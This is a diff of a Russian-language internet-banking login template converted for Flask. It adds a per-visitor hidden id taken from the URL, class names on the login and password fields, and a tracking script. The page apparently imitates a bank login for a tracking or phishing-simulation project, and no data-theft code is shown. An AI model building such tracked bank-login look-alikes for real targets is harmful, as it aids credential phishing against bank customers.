@@ -5,9 +5,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Интернет-банкинг</title>
-    <link rel="stylesheet" href="style.css" />
-    <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_4.2.css" />
-</head>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_4.2.css') }}">
+
 
 <body>
     <div class="login-container">
@@ -20,23 +19,24 @@
             </div>
         </div>
 
-        <form class="login-form">
+        <form class="login-form" action="/site_4.2" method="get">
+            <input type="hidden" name="id" value="{{ request.args.get('id') }}">
             <div class="input-wrapper">
                 <i class="fa fa-user icon"></i>
-                <input type="text" placeholder="Логин" required />
+                <input class="логин" type="text" placeholder="Логин" required />
             </div>
 
             <div class="input-wrapper">
                 <i class="fa fa-key icon"></i>
-                <input type="password" placeholder="Пароль" required />
+                <input class="пароль" type="password" placeholder="Пароль" required />
                 <i class="fa fa-eye-slash eye-icon"></i>
             </div>
 
             <button type="submit" class="login-btn">Войти</button>
 
             <div class="radio-group">
-                <label><input type="radio" name="auth" checked /> Код с карты кодов</label>
-                <label><input type="radio" name="auth" /> Одноразовый СМС-код</label>
+                <label><input class="Код с карты кодов" type="radio" name="auth" checked /> Код с карты кодов</label>
+                <label><input class="Одноразовый СМС-код" type="radio" name="auth" /> Одноразовый СМС-код</label>
             </div>
 
             <div class="links">
@@ -44,6 +44,7 @@
             </div>
         </form>
     </div>
+    <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
 </body>
 
 </html>
